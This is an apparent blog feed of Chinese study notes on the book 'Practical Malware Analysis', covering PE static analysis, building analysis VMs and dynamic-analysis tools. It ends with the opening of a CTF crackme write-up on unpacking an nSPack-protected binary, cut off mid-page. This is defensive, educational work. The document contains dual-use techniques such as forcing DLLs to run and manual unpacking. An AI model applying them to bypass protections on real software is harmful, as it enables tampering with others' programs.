些合法使用的场景，但如果你分析的是个可疑的恶意代码，而当你看到了这个函数时，你就很可能在查看一 个键盘记录功能。</p></blockquote><blockquote><p>RegisterHotKey函数也很有趣。它注册了一 个热键 （如Ctrl+ Shift＋P，这样每当用户按下热键组合后，便会通知应用程序。无论当前是哪个应用程序处于活动状态，热键都会将用户带到注册了热键的应用程序。</p></blockquote><blockquote><p>从GDI32.dll的导入函数是和图形相关的，这只是再次确认了这个程序拥有一 个图形化界面。从Shell32.dll的导入函数告诉我们，这个程序可以启动其他程序一一这个功能对于恶意代码和合法软件都是普遍的功能。</p></blockquote><blockquote><p>从Advapi32.dll的导入函数则显示，这个程序使用了注册表，这又提示我们，我们应该去搜索一些看起来像是注册表键值的字符串。注册表键值与文件目录非常类似。在这种案例中，我们发现了一个字符串Software＼Microsoft\Windows\CurrentVersion\Run，这是一 个恶意代码非常普遍使用的注册表键值，控制Windows启动时会自动装载哪些程序。</p></blockquote><h2 id="1x8-PE文件头与分节"><a href="#1x8-PE文件头与分节" class="headerlink" title="1x8 PE文件头与分节"></a>1x8 PE文件头与分节</h2><p>PE文件格式包括一 个PE文件头，随后跟着一 系列的分节。文件头中包含了有关文件本身的元数据。而头部之后是文件的一 些实际部分，每个分节中都包含了有用的信息。</p><blockquote><p>.text: . text节包含了CPU执行指令。所有其他节存储数据和支持性的信息。一般来说，这是唯一可以执行的节，也应该是唯一包含代码的节。</p></blockquote><blockquote><p>.rdata: . rdata节通常包含导入与导出函数信息，与Dependency Walker和PEview工具所在得的</p></blockquote><blockquote><p>信息是相同的。这个节中还可以存储程序所使用的其他只读数据．。有些文件中还会包含.idata和.edata节，来存储导入导出信息。 （见表1-4）。</p></blockquote><blockquote><p>.data, . data节包含了程序的全局数据，可以从程序的任何地方访问到。本地数据并不存储在这个节中，而是PE文件某个其他位置上。</p></blockquote><blockquote><p>.rsrc: . rsrc节包含由可执行文件所使用的资源，而这些内容并不是可执行的，比如图标、图片、菜单项和字符串等。字符串可以存储在．rsrc节中，或在主程序里。在.rsrc节中经常存储的字符串是为了提供多语种支持的。</p></blockquote><p><a href="https://i.loli.net/2018/07/15/5b4b6383c5e86.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/15/5b4b6383c5e86.jpg" class="lazyload"></a></p><h3 id="1-用PEview来分析PE文件"><a href="#1-用PEview来分析PE文件" class="headerlink" title="1. 用PEview来分析PE文件"></a>1. 用PEview来分析PE文件</h3><p>PE文件格式在头部中存储了很多有趣的信息。我们可以使用PEview工具来浏览这些信息</p><blockquote><p>PE头中的前两个部分IMAGE_DOS_HEADER和MS-DOS存根程序，是历史遗留问题，对我们而言没有提供任何值得关注的信息。</p></blockquote><blockquote><p>PE文件头中的下一 部分，IMAGE_NT_HEADERS，显示了N T文件头。特征签名始终是相同的，可以被直接忽略。</p></blockquote><blockquote><p>时间戳告诉我们这个可执行文件是什么时候编译的，这在恶意代码分析与事件处理中会非常有用。例如，一个很老的编译时间意味着古老的攻击，反病毒软件就可能包含这个恶意代码的检测特征，而一 个很新的编译时间意味的情况则正好相反。</p></blockquote><blockquote><p>所有的Delphi程 序都使用统一 的编译时间，都是1992年6月四日。如果你看到这个编译时间，就可以确定很可能是在查看一个Delphi程序，但是不会知道它被编译的确切时间。</p></blockquote><h3 id="2-使用ResourceHacker工具来查看资源节"><a href="#2-使用ResourceHacker工具来查看资源节" class="headerlink" title="2. 使用ResourceHacker工具来查看资源节"></a>2. 使用ResourceHacker工具来查看资源节</h3><p>你可以免费使用从 http//:<a href="http://www.angusj.com" target="_blank" rel="noopener">www.angusj.com</a> 上找到的ResourceHacker工具来浏览.rsrc节。当你单击ResourceHacker工具中分析获得的条目时，你就会看到字符串、图标和菜单，而显示的菜单项和程序所使用的是一致的。</p><p>恶意代码，偶尔一些合法软件 ，经常会把一个嵌入的程序或者驱动放在资源节中，在程序运行之前，它们会将嵌入可执行文件或驱动提取出来，Resource Hacker可以帮助你提取这些文件来进行基础分析。</p><h3 id="3-使用其他的PE文件工具"><a href="#3-使用其他的PE文件工具" class="headerlink" title="3. 使用其他的PE文件工具"></a>3. 使用其他的PE文件工具</h3><p>除了上面介绍的一 些工具之外，还存在着很多可以用来浏览PE文件头的其他工具。其中两个最有用的是PEBrowse Professional和PE Explorer.<br>PEBrowse Professional （<a href="http://www.smidgeonsoft.prohosting" target="_blank" rel="noopener">http://www.smidgeonsoft.prohosting</a>. com/pebrowsepro-file-viewer.html) 与PE view类似。它允许你查看每个分节中的字节，并显示出解析后的数据。PEBrowse Professional在呈现从资源节（.rsrc）获取的信息上做得更好。<br>PE Explorer (<a href="http://www.heaventools.com／）有着一">http://www.heaventools.com／）有着一</a> 个功能丰富的图形用户界面，让你可以方便地浏览PE文件的各个部分。你还可以编辑PE文件的特定部分，它所包含的资源编辑器对于浏览和编辑文件资源来说是非常棒的。然而这个工具的主要缺点是一一 它不是免费的。</p><h3 id="4-PE文件头概述"><a href="#4-PE文件头概述" class="headerlink" title="4. PE文件头概述"></a>4. PE文件头概述</h3><p><a href="https://i.loli.net/2018/07/15/5b4b63d9a4b57.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/15/5b4b63d9a4b57.jpg" class="lazyload"></a></p><h2 id="1x9-小结"><a href="#1x9-小结" class="headerlink" title="1x9 小结"></a>1x9 小结</h2><p>利用一 套相对简单的工具，我们就可以对恶意代码进行静态分析，来获得对它功能的一些观察。但是静态分析通常只是第一步，通常还需要进一步分析。下一步我们需要创建一 个安全的环境，这样你就可以运行恶意代码，并执行基础的动态分析方法。</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h1 id=&quot;静态分析基础技术&quot;&gt;&lt;a href=&quot;#静态分析基础技术&quot; class=&quot;headerlink&quot; title=&quot;静态分析基础技术&quot;&gt;&lt;/a&gt;静态分析基础技术&lt;/h1&gt;&lt;h2 id=&quot;1x1-反病毒引擎扫描：实用的第一步&quot;&gt;&lt;a</summary>
        
      
    
    
    
    <category term="病毒分析" scheme="https://kabeor.github.io/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"/>
    
    <category term="《恶意代码分析实战》笔记" scheme="https://kabeor.github.io/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/%E3%80%8A%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%E3%80%8B%E7%AC%94%E8%AE%B0/"/>
    
    <category term="第一篇 静态分析" scheme="https://kabeor.github.io/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/%E3%80%8A%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%E3%80%8B%E7%AC%94%E8%AE%B0/%E7%AC%AC%E4%B8%80%E7%AF%87-%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/"/>
    
    
    <category term="病毒分析" scheme="https://kabeor.github.io/tags/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>第2章 在虚拟机中分析恶意代码</title>
    <link href="https://kabeor.github.io/%E7%AC%AC2%E7%AB%A0%20%E5%9C%A8%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%AD%E5%88%86%E6%9E%90%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/"/>
    <id>https://kabeor.github.io/%E7%AC%AC2%E7%AB%A0%20%E5%9C%A8%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%AD%E5%88%86%E6%9E%90%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/</id>
    <published>2018-07-14T16:00:00.000Z</published>
    <updated>2020-03-16T04:23:22.396Z</updated>
    
    <content type="html"><![CDATA[<h1 id="第2章-在虚拟机中分析恶意代码"><a href="#第2章-在虚拟机中分析恶意代码" class="headerlink" title="第2章 在虚拟机中分析恶意代码"></a>第2章 在虚拟机中分析恶意代码</h1><h2 id="2x1-虚拟机的结构"><a href="#2x1-虚拟机的结构" class="headerlink" title="2x1 虚拟机的结构"></a>2x1 虚拟机的结构</h2><p><a href="https://i.loli.net/2018/07/15/5b4b646c38fb4.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/15/5b4b646c38fb4.jpg" class="lazyload"></a></p><h2 id="2x2-创建恶意代码分析机"><a href="#2x2-创建恶意代码分析机" class="headerlink" title="2x2 创建恶意代码分析机"></a>2x2 创建恶意代码分析机</h2><blockquote><ol><li>配置VMware</li><li>断开网络</li><li>创建主机模式网络</li><li>使用多个虚拟机</li></ol></blockquote><h2 id="2x3-使用恶意代码分析机"><a href="#2x3-使用恶意代码分析机" class="headerlink" title="2x3 使用恶意代码分析机"></a>2x3 使用恶意代码分析机</h2><blockquote><ol><li>让恶意代码连接互联网</li><li>连接和断开外围设备</li><li>拍摄快照</li><li>从虚拟机传输文件</li></ol></blockquote><h2 id="2x4-使用VMware-进行恶意代码分析的风险"><a href="#2x4-使用VMware-进行恶意代码分析的风险" class="headerlink" title="2x4 使用VMware 进行恶意代码分析的风险"></a>2x4 使用VMware 进行恶意代码分析的风险</h2><p>即使你采取了一切可能的预防措施，当你分析恶意代码时还是会面临一些风险。因此，不管你在虚拟机中做什么，特别是分析恶意代码的时候，一定要避免在任何关键或敏感的宿主机上进行。</p><h2 id="2x5-记录／重放：重复计算机运行轨迹"><a href="#2x5-记录／重放：重复计算机运行轨迹" class="headerlink" title="2x5 记录／重放：重复计算机运行轨迹"></a>2x5 记录／重放：重复计算机运行轨迹</h2><p>这章就是介绍虚拟机，没什么可说的，但要了解风险</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h1 id=&quot;第2章-在虚拟机中分析恶意代码&quot;&gt;&lt;a href=&quot;#第2章-在虚拟机中分析恶意代码&quot; class=&quot;headerlink&quot; title=&quot;第2章 在虚拟机中分析恶意代码&quot;&gt;&lt;/a&gt;第2章 在虚拟机中分析恶意代码&lt;/h1&gt;&lt;h2</summary>
        
      
    
    
    
    <category term="病毒分析" scheme="https://kabeor.github.io/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"/>
    
    <category term="《恶意代码分析实战》笔记" scheme="https://kabeor.github.io/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/%E3%80%8A%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%E3%80%8B%E7%AC%94%E8%AE%B0/"/>
    
    <category term="第一篇 静态分析" scheme="https://kabeor.github.io/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/%E3%80%8A%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%E3%80%8B%E7%AC%94%E8%AE%B0/%E7%AC%AC%E4%B8%80%E7%AF%87-%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/"/>
    
    
    <category term="病毒分析" scheme="https://kabeor.github.io/tags/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>第3章 动态分析基础技术</title>
    <link href="https://kabeor.github.io/%E7%AC%AC3%E7%AB%A0%20%E5%8A%A8%E6%80%81%E5%88%86%E6%9E%90%E5%9F%BA%E7%A1%80%E6%8A%80%E6%9C%AF/"/>
    <id>https://kabeor.github.io/%E7%AC%AC3%E7%AB%A0%20%E5%8A%A8%E6%80%81%E5%88%86%E6%9E%90%E5%9F%BA%E7%A1%80%E6%8A%80%E6%9C%AF/</id>
    <published>2018-07-14T16:00:00.000Z</published>
    <updated>2020-03-16T04:23:38.482Z</updated>
    
    <content type="html"><![CDATA[<h1 id="第3章-动态分析基础技术"><a href="#第3章-动态分析基础技术" class="headerlink" title="第3章 动态分析基础技术"></a>第3章 动态分析基础技术</h1><h2 id="3x1-沙箱：简便但粗糙的方法"><a href="#3x1-沙箱：简便但粗糙的方法" class="headerlink" title="3x1 沙箱：简便但粗糙的方法"></a>3x1 沙箱：简便但粗糙的方法</h2><p>沙箱是一种在安全环境里运行不信任程序的安全机制，不用担心伤害到 “真正的” 系统。沙箱包含一个虚拟环境，通过某种方式模拟网络服务，以确保被测试的软件或恶意代码能正常执行。</p><h3 id="1-使用恶意代码沙箱"><a href="#1-使用恶意代码沙箱" class="headerlink" title="1. 使用恶意代码沙箱"></a>1. 使用恶意代码沙箱</h3><p>在计算机安全专业人士眼中， Norman沙箱、GFI沙箱（也就是以前的CWSandbox）是最受欢迎的。</p><h3 id="2-沙箱的缺点"><a href="#2-沙箱的缺点" class="headerlink" title="2. 沙箱的缺点"></a>2. 沙箱的缺点</h3><blockquote><p>沙箱只能简单地运行可执行程序，不能带有命令行选项。如果恶意代码需要一 些命令选项才能执行，在不提供选项的条件下，任何代码都不会被执行。另外，如果你分析的恶意程序样本是一 个后门程序，需要等待一条控制指令，才会启动特定行为，那么在沙箱中这个后门程序将无法被启动和分析。</p></blockquote><blockquote><p> 沙箱也不能记录所有事件，因为不管是你或是沙箱，都不会等待足够长的时间让所有事件发生。</p></blockquote><h4 id="潜在的缺点"><a href="#潜在的缺点" class="headerlink" title="潜在的缺点"></a>潜在的缺点</h4><blockquote><p>恶意代码经常检测它是否运行在一 个虚拟机里，并且如果检测到了虚拟机，恶意代码将会停止运行，或者表现异常。不是所有沙箱都能完善地考虑这一问题。</p></blockquote><blockquote><p>一些恶意代码需要系统上拥有特定的注册表项或者文件才会执行，而这些在沙箱内是找不到的。这些就可能需要包含一 些合法数据，比如控制命令或者加密钥。</p></blockquote><blockquote><p>如果恶意代码是一个DLL，一些导出函数可能不会被恰当地调用，因为一个DLL文件不像可执行文件那样容易运行。</p></blockquote><blockquote><p>沙箱环境的操作系统对恶意代码来说可能不正确。例如，恶意代码在Windows XP上正常运行，而在Windows 7上跑不通。</p></blockquote><blockquote><p>沙箱不能告诉你恶意代码做了什么。它能报告基本功能，但是它不能告诉你恶意代码是一个定制的SAM密文记录器，或是一个加密的键盘记录后门程序。这些结论需要你自己总结。</p></blockquote><h2 id="3x2-运行恶意代码"><a href="#3x2-运行恶意代码" class="headerlink" title="3x2 运行恶意代码"></a>3x2 运行恶意代码</h2><blockquote><p>如何成功启动DLL文件，来进行动态分析。</p></blockquote><p>在所有的Windows 版本中都包含rundll32.exe程序，它提供了一 个运行DLL的平台，用下面的语法格式：<br><code>C:\&gt;rundll32.exe DLLname, Export arguments</code></p><p>Export值必须是一个DLL文件导出函数表中的函数名或者序号。可以用PEview或者PE Explorer工具查看导出函数表。</p><p>因为恶意的DLL文件通常在DLLMain （称作DLL函数入口点）执行它们的代码，因为无论DLL什么时候被加载，DLLMain函数总会被执行，这样你就总能通过使用rundll32.exe1J口载D LL，而动态地获取信息。除此之外，你甚至可以通过修改PE头部，并改变它的扩展名，使得Windows以一 种可执行文件的方式来加载DLL。</p><p>我们可以使用如下方法来修改PE头部，就是从IMAGE_FILE_HEADER的特征域里擦除IMAGE_FILE_DLL (0x2000）标记。尽管这样的改变不会执行任何输入函数，但它会调用DLLMain方法，而且有可能造成恶意代码意想不到的崩溃或者终止。然而，只要你的修改能使恶意代码执行它的恶意部分，你就能为你的分析收集到信息，余下的就不重要了。</p><p>DLL形态的恶意代码也可能需要被安装成一个服务，SerνiceName参数必须提供给恶意代码，让它能被安装并运行起来。而在Windows系统中启动指定的服务，可以使用net start命令。</p><p>当你看见一个ServiceMain函数，没有像Install或InstallSer、vice这样方便地导出函数，你需妥手动地安装服务。你可以使用Windows系统下的SC命令，或者修改注册表为一个未使用服务进行手动安装，然后使用net start启动服务。Windows服务的注册表项位于HKLM\SYSTEM\CurrentControlSet\Serviceso</p><h2 id="3x3-进程监视器"><a href="#3x3-进程监视器" class="headerlink" title="3x3 进程监视器"></a>3x3 进程监视器</h2><p>进程监视器（Process Monitor）是Windows系统下的高级监视工具，它提供一 种方式来监控注册表、文件系统、网络、进程和线程行为。它结合并增强了两种工具的功能：文件监视器FileMon和注册表监视器RegMon。</p><blockquote><p>由于进程监视器使用内存来记录事件，直到告知它停止捕获，这就可能因耗尽所有可用内存而使虚拟机崩溃。为了避免这样，运行进程监视器就需要限定一 个比较短的时间。为停止进程监视器捕获事件，选择File→Capture Events。在使用进程监视器进行分析之前，首先要清空当前所有截获的事件，通过选择Edit→Clear Display清除掉不相关数据，接下来再执行分析对象，开启监视器捕旗。几分钟之后，就可以终止事件捕获。</p></blockquote><h3 id="1-进程监视器的显示"><a href="#1-进程监视器的显示" class="headerlink" title="1. 进程监视器的显示"></a>1. 进程监视器的显示</h3><p>进程监视器展示了一个可配置栏，包含了每个事件的不同信息，如事件序列号、时间戳、引发事件的进程名、事件操作、事件使用的路径、事件结果等。这些详细的信息可能太长而不适合屏幕显示，或者可能难以清晰地阅读。如果你发现这种情况，可以通过双击该行，来查看这个事件的全部细节。</p><h3 id="2-进程监视器中的过滤"><a href="#2-进程监视器中的过滤" class="headerlink" title="2. 进程监视器中的过滤"></a>2. 进程监视器中的过滤</h3><p>为了设置一 个过滤器，我们选择Filter→Filter打开过滤菜单。当设置一个过滤器时，首先通过左上角的下拉菜单（Reset按钮上面〉选择一栏。对恶意代码分析最重要的过滤栏是进程名、操作和细节。然后，选择一 个比较器，从is、contains、less than中选一项。最后，选择在过滤器里是包含还是排除。因为在默认情况下，过滤器要呈现所有系统调用，所以减少呈现结果的数量十分重要。</p><blockquote><p>进程监视器在工具栏里提供有用的自动过滤功能，它们通过以下四个分类进行过滤：注册表、文件系统、网络和进程行为。</p></blockquote><blockquote><p>注册表：通过检查注册表操作，你能辨别一个恶意程序是怎样把自己添加到注册表中去的。</p></blockquote><blockquote><p>文件系统：检查文件系统能显示恶意程序创建的所有文件，或它使用的配置文件。</p></blockquote><blockquote><p>进程行为：检查进程行为能告诉你恶意程序是否启动了其他的进程。</p></blockquote><blockquote><p>网络：识别网络连接能向你展示恶意程序监听的任意端口。</p></blockquote><blockquote><p>所有的这四个过滤器都是默认选择的。如果要关闭过滤器，只需简单地单击工具栏上相应的图标即可。</p></blockquote><h2 id="3x4-使用进程浏览器（-Process-Explorer-）来查看进程"><a href="#3x4-使用进程浏览器（-Process-Explorer-）来查看进程" class="headerlink" title="3x4 使用进程浏览器（ Process Explorer ）来查看进程"></a>3x4 使用进程浏览器（ Process Explorer ）来查看进程</h2><p>进程浏览器（Process Explorer）是微软的免费产品，它是一 款非常强大的任务管理器，是进行动态分析时必备的工具。它能对当前系统上运行的进程提供非常有价值的洞察能力。</p><p>你可以用进程浏览器来列出所有活跃的进程、被进程载入的DLL、、各种进程属性和整体系统信息。你也能用它杀死一 个进程、退出用户登录、启动与激活进程。</p><h3 id="1-进程浏览器的显示"><a href="#1-进程浏览器的显示" class="headerlink" title="1. 进程浏览器的显示"></a>1. 进程浏览器的显示</h3><p>进程浏览器监视系统上执行的进程，以树状结构进行显示。</p><p>进程浏览器显示了五栏：Process （进程名）、PID （进程号）、CPU (CPU使用率）、Description（进程描述〉、Company Name （软件公司名〉。视图每一 秒更新一次。默认情况下，服务以粉色高亮显示，进程显示为蓝色，新进程为绿色，被终止进程则为红色。绿色和红色的高亮显示是临时的，当进程被完全启动或终止后颜色就会改变。当分析恶意代码时，需要实时观察进程浏览器窗口中进程的改变或新建进程，保证能够完全地调查它们。</p><h3 id="2-使用验证选项"><a href="#2-使用验证选项" class="headerlink" title="2. 使用验证选项"></a>2. 使用验证选项</h3><p>进程浏览器一个特别有用的功能就是镜像标签里的验证 （Verify）按钮。单击此按钮，可以验证磁盘上的镜像文件是否具有微软的签名认证。因为微软为大部分核心的可执行文件使用了数字签名。通过进程浏览器验证签名是否有效，你就能确定该文件是否确实是微软发布的可执行文件。这一功能对验证磁盘上Windows文件没有被破坏时尤其有用，因为恶意代码经常替换Windows认证文件，并且试图隐藏。</p><p>验证按钮验证的是磁盘上的镜像文件，而不是内存中的，因此它可能会失效，如果一个攻击者使用进程替换技术process replacement，包括在系统上执行进程并用恶意代码重写内存空间，这时候这个功能就不再有用武之地了。进程替换技术为恶意代码提供了和其他进程同样的特权，恶意代码看起来就像一个合法执行的进程一样，但是它在内存中的镜像会和磁盘上的不一样。</p><h3 id="3-比较字符串"><a href="#3-比较字符串" class="headerlink" title="3. 比较字符串"></a>3. 比较字符串</h3><p>一种识别进程替换的方法就是使用进程属性窗口的字符串 （Strings）标签，通过比较包含在磁盘上可执行文件的字符串与内存中同一个可执行文件的字符串，来看两者是否相同。可以用左下角的单选按钮在这两个字符串视图间切换。如果这两个字符串列表有很大不同，那么可能就发生了进程替换。</p><h3 id="4-使用依赖遍历器（-Dependency-Walker"><a href="#4-使用依赖遍历器（-Dependency-Walker" class="headerlink" title="4. 使用依赖遍历器（ Dependency Walker )"></a>4. 使用依赖遍历器（ Dependency Walker )</h3><p>进程浏览器允许你在运行进程上启动depends.exe (Dependency Walker），通过右击进程名并选择Launch→Depends。它也能让你通过选择Find→ Find Handle or DLL找到一个句柄或D LL。</p><p>Find DLL选项在有些时候特别有用，比如当你在磁盘上尝试发现一 个恶意的DLL，并且想知道是否有运行进程使用了这个DLL时。验证按钮验证磁盘上的EXE文件，但不会对所有动态时刻装载的DLL文件进行验证。为了判断一 个DLL是否被加载到进程，你可以比较进程浏览器中的DLL列表与在Dependency Walker工具中显示的导入DLL列表。</p><h3 id="5-分析恶意文档"><a href="#5-分析恶意文档" class="headerlink" title="5. 分析恶意文档"></a>5. 分析恶意文档</h3><p>还可以使用进程浏览器来分析恶意文挡，比如PDF和Word文档。一种快速确定一个文档是否恶意的方法，就是打开进程浏览器，然后再打开文档。若文档启动了任意进程，你都能在进程浏览器中看到，并能通过属性窗口中的镜像Clmage）标签来定位恶意代码在磁盘上的位置。</p><h2 id="3x5-使用Regshot来比较注册表快照"><a href="#3x5-使用Regshot来比较注册表快照" class="headerlink" title="3x5 使用Regshot来比较注册表快照"></a>3x5 使用Regshot来比较注册表快照</h2><p>Regshot是一个开源的注册表比较工具，它可以让你比较两个注册表的快照，发现差异。</p><p>使用Regshot工具分析恶意代码，只要简单地单击1st Shot按钮进行第一次快照，然后运行恶意代码，等待它对系统做出改变，然后单击2nd Shot按钮进行第二次快照，最后单击Compare按钮比较这两次快照。</p><h2 id="3x6-模拟网络"><a href="#3x6-模拟网络" class="headerlink" title="3x6 模拟网络"></a>3x6 模拟网络</h2><p>恶意代码经常会连接到命令与控制服务器。你需要采用一些模拟网络的基本步骤，用来快速获得网络资源，而不需要实际地连接互联网。这些资源可以包括DNS域名系统、IP地址和数据包记录器。</p><p>为了能够成功模拟网络，你必须防止恶意代码探测到自己正运行在一个虚拟环境中 </p><h3 id="1-使用ApateDNS"><a href="#1-使用ApateDNS" class="headerlink" title="1. 使用ApateDNS"></a>1. 使用ApateDNS</h3><p>ApateDNS是一款来自Mandiant公司的免费软件（<a href="http://www.mandiant.com/products/research/mandiant_apatedns/download），是用来查看" target="_blank" rel="noopener">www.mandiant.com/products/research/mandiant_apatedns/download），是用来查看</a> 恶意代码发出DNS请求最快速的方式。ApateDNS在本机上通过监听UDP的53端口，对用户指定的IP地址给出虚假的DNS响应。它用你指定的IP地址去响应DNS查询请求。ApateDNS可以使用十六进制和ASCII码来显示所有接收到的请求。</p><p>为了使用ApateDNS，需要设置你想在DNS响应包中发出的IP地址，并选择接口。接下来，单击Start Server按钮，这将自动启动DNS服务，并修改DNS设置到localhost上。然后，运行你要分析的恶意代码，就可以在ApateDNS的窗口观察出现的DNS请求。</p><h3 id="2-使用Netcat进行监视"><a href="#2-使用Netcat进行监视" class="headerlink" title="2. 使用Netcat进行监视"></a>2. 使用Netcat进行监视</h3><p>Netcat被称作 “TCP/IP协议枝瑞士军刀” ，可以被用在支持端口扫描、隧道、代理、端口转发等的对内对外连接上。在监听模式下，Netcat充当一个服务器，而在连接模式下作为一 个客户端。Netcat从标准输入得到数据进行网络传输，而它得到的数据，又可以通过标准输出显示到屏幕上。</p><h2 id="3x7-使用Wireshark进行数据包监听"><a href="#3x7-使用Wireshark进行数据包监听" class="headerlink" title="3x7 使用Wireshark进行数据包监听"></a>3x7 使用Wireshark进行数据包监听</h2><p>Wireshark是一 个开源的嗅探器，是一个截获并记录网络数据包的工具。 Wireshark提供可视化、包一流分析和单个数据包的深入分析。</p><blockquote><p>Wireshark的界面显示有四部分</p></blockquote><blockquote><p>过滤栏。用来过滤显示的数据包。<br>数据包列表显示了所有满足过滤条件的数据包。<br>数据包细节窗口显示了当前选中包的详细内容。<br>十六进制窗口。显示了当前数据包的十六进制内容，十六进制窗口和数据包细节窗口紧密关联，会高亮显示你所选择的任何域。</p></blockquote><h2 id="3x8-使用INetSim"><a href="#3x8-使用INetSim" class="headerlink" title="3x8 使用INetSim"></a>3x8 使用INetSim</h2><p>INetSim是一款基于Linux模拟常见网络服务的免费软件。</p><p>INetSim是一 款提供 模 拟服 务最 好 的免 费工 具 ，它通 过 模拟 服 务 〈如Http、HTTPS、FTP、IRC、DNS、SMTP等），允许你分析未知恶意代码的网络行为。</p><blockquote><p>INetSim努力伪装得像一 台真正的服务器，有许多容易配置的特性来保证其成功。例如，若被扫描到，它会返回Microsoft IIS网络服务器的旗标。</p><p>INetSim一 些最好的特性被融进了HTTP和HTTPS服务模拟中。例如，IN etSim 几乎能提供所有的文件请求服务：如果一 个恶意程序从一 个站点请求JPEG 以继续它的操作，IN etSim 就会回应一 个适当的JPEG。虽然这个图片可能不是恶意代码要找的，但服务器不至于给出404或者其他错误。这个响应即使不正确，仍能保证恶意代码继续运行。</p><p>INetSim也可以记录所有的连入请求与连接，你会发现这个功能特别有用，比如可以判断一 个恶意代码是否连接到一 个标准服务，或是查看它所发出的请求。IN etSim 也非常容易配置，例如，你可以设置请求后返回一 个页面或者一 个项 目，因此如果你发现你分析的恶意代码在查找一 个特别的网页，然后才能继续执行，你就可以提供这个网页：你也能修改不同服务监听的端口号，这对恶意代码使用非标准端口时非常有用。 </p></blockquote><blockquote><p>INetSim专为恶意代码分析而创建，所以它也提供了许多独特的优点，比如它的Dummy服务就记录了所有从客户端口收到的数据。Dummy服务在捕获所有从客户端向端口发出的数据时最有用，而不受制于其他服务模块。你可以使用它记录恶意代码连接的所有端口和发送数据。至少TCP握手会完整地进行，一些进一 步传输的额外数据也可以收集到。</p></blockquote>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h1 id=&quot;第3章-动态分析基础技术&quot;&gt;&lt;a href=&quot;#第3章-动态分析基础技术&quot; class=&quot;headerlink&quot; title=&quot;第3章 动态分析基础技术&quot;&gt;&lt;/a&gt;第3章 动态分析基础技术&lt;/h1&gt;&lt;h2 id=&quot;3x1-沙箱：简便但粗糙的方法&quot;&gt;&lt;a</summary>
        
      
    
    
    
    <category term="病毒分析" scheme="https://kabeor.github.io/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"/>
    
    <category term="《恶意代码分析实战》笔记" scheme="https://kabeor.github.io/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/%E3%80%8A%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%E3%80%8B%E7%AC%94%E8%AE%B0/"/>
    
    <category term="第一篇 静态分析" scheme="https://kabeor.github.io/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/%E3%80%8A%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%E3%80%8B%E7%AC%94%E8%AE%B0/%E7%AC%AC%E4%B8%80%E7%AF%87-%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/"/>
    
    
    <category term="病毒分析" scheme="https://kabeor.github.io/tags/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>第三届上海市大学生网络安全大赛crackme</title>
    <link href="https://kabeor.github.io/%E7%AC%AC%E4%B8%89%E5%B1%8A%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9Bcrackme/"/>
    <id>https://kabeor.github.io/%E7%AC%AC%E4%B8%89%E5%B1%8A%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9Bcrackme/</id>
    <published>2018-07-14T16:00:00.000Z</published>
    <updated>2020-03-16T04:26:58.416Z</updated>
    
    <content type="html"><![CDATA[<h1 id="第三届上海市大学生网络安全大赛crackme"><a href="#第三届上海市大学生网络安全大赛crackme" class="headerlink" title="第三届上海市大学生网络安全大赛crackme"></a>第三届上海市大学生网络安全大赛crackme</h1><p>用PEID查壳</p><p><a href="https://i.loli.net/2018/07/15/5b4b6580a49f8.jpg" data-fancybox="group" data-caption="image" class="fancybox"><img alt="image" title="image" data-src="https://i.loli.net/2018/07/15/5b4b6580a49f8.jpg" class="lazyload"></a></p><p>发现是个nSPack的壳</p><blockquote><p>手脱</p></blockquote><p><a href="https://i.loli.net/2018/07/15/5b4b6580b764f.jpg" data-fancybox="group" data-caption="image" class="fancybox"><img alt="image" title="image" data-src="https://i.loli.net/2018/07/15/5b4b6580b764f.jpg" class="lazyload"></a></p><p>OD自动载入之后停在了这里，发现是pushfd和pushad</p><p>所以有两种方法</p><p>A：popad寻找法</p><p>用Ctrl+F去查找popad</p><p>B：ESP定律法</p><p>第一个命令先F8，单步执行</p><p><a 